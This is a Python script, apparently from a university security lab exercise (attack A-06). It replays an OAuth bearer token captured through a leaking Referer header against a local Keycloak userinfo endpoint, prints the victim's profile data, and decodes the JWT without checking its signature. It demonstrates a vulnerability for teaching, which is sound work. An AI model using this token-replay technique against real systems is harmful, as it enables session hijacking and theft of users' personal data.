#!/usr/bin/env python3
"""
A-06 — Usar token capturado via Referer Header
GID Lab Grupo 4

Uso (3 formas):
  python attacks/a06_use_token.py <token>        ← colar directo como argumento
  echo "<token>" | python attacks/a06_use_token.py  ← via pipe
  python attacks/a06_use_token.py                ← interactivo (digitar/colar e Ctrl+D)
"""

import sys
import json
import base64
import urllib.request
import urllib.error

KEYCLOAK_BASE  = "http://localhost:8080"
KEYCLOAK_REALM = "gid-lab"
USERINFO_URL   = f"{KEYCLOAK_BASE}/realms/{KEYCLOAK_REALM}/protocol/openid-connect/userinfo"

LINE = "=" * 65

def decode_jwt_part(part):
    """Decodifica uma parte do JWT (base64url → dict)."""
    # Normalizar base64url → base64 e adicionar padding
    part = part.replace("-", "+").replace("_", "/")
    padding = 4 - len(part) % 4
    if padding != 4:
        part += "=" * padding
    try:
        decoded = base64.b64decode(part).decode("utf-8", errors="replace")
        return json.loads(decoded)
    except Exception as e:
        return {"erro": str(e)}


def call_userinfo(token):
    """Chama o userinfo endpoint do Keycloak com o token."""
    req = urllib.request.Request(
        USERINFO_URL,
        headers={"Authorization": f"Bearer {token}"}
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        body = {}
        try:
            body = json.loads(e.read())
        except Exception:
            pass
        return e.code, body
    except Exception as e:
        return 0, {"erro": str(e)}


def print_json(data, indent=2):
    """Imprime JSON formatado com indentação."""
    print(json.dumps(data, indent=indent, ensure_ascii=False))


def main():
    print()
    print(LINE)
    print("  A-06 — Token Capturado via Referer Header")
    print("  GID Lab Grupo 4")
    print(LINE)
    # --- Obter token: argumento, pipe, ou interactivo ---
    if len(sys.argv) > 1:
        # Modo argumento: python a06_use_token.py eyJhbGci...
        token = sys.argv[1].strip()
        print(f"  Token recebido via argumento ({len(token)} chars)\n")

    elif not sys.stdin.isatty():
        # Modo pipe: echo "eyJ..." | python a06_use_token.py
        token = sys.stdin.read().strip()
        print(f"  Token recebido via stdin ({len(token)} chars)\n")

    else:
        # Modo interactivo: colar e premir Ctrl+D (não Enter)
        print("  Cole o token e prima Ctrl+D (Mac/Linux) para confirmar:")
        print()
        try:
            token = sys.stdin.read().strip()
        except (KeyboardInterrupt, EOFError):
            print("\n\n  Cancelado.")
            sys.exit(0)

    if not token:
        print("\n  [ERRO] Nenhum token introduzido.")
        sys.exit(1)

    print()
    print("-" * 65)
    print(f"  A consultar o Keycloak com o token roubado...")
    print(f"  URL: {USERINFO_URL}")
    print("-" * 65)
    print()

    status, data = call_userinfo(token)

    print(f"  HTTP Status: {status}")
    print()

    if status == 200:
        print("  ✅  TOKEN VÁLIDO — Dados do utilizador obtidos com sucesso:\n")
        for k, v in data.items():
            print(f"    {k:30s} {v}")
        print()
        print("  ⚠️   O atacante obteve estes dados SEM conhecer a password!")
    else:
        print("  ❌  TOKEN INVÁLIDO ou expirado.\n")
        print("  Resposta do servidor:")
        print_json(data)

    # --- Decode do JWT ---
    print()
    print("-" * 65)
    print("  Decode do JWT (sem verificar assinatura):")
    print("-" * 65)

    parts = token.split(".")
    if len(parts) < 2:
        print("\n  [AVISO] Formato JWT inválido (esperado header.payload.signature)")
        sys.exit(0)

    header  = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])

    print("\n  [HEADER]")
    print_json(header)

    print("\n  [PAYLOAD]")
    print_json(payload)

    # Mostrar campos relevantes em destaque
    print()
    print("-" * 65)
    print("  Campos de interesse:")
    print("-" * 65)
    for field in ("preferred_username", "email", "realm_access", "exp", "sub"):
        val = payload.get(field)
        if val is not None:
            print(f"    {field:25s} {val}")

    print()
    print(LINE)


if __name__ == "__main__":
    main()
